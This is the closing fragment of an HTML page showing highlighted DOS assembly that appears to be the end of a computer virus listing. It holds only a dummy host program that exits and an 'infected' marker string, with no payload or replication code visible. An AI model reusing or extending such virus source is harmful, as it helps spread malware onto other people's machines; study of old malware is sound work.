</span><span class="sc1">;*        viruses' identification bytes.                 *</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">Host_Program</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">Infected_Mark</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'YTIT'</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
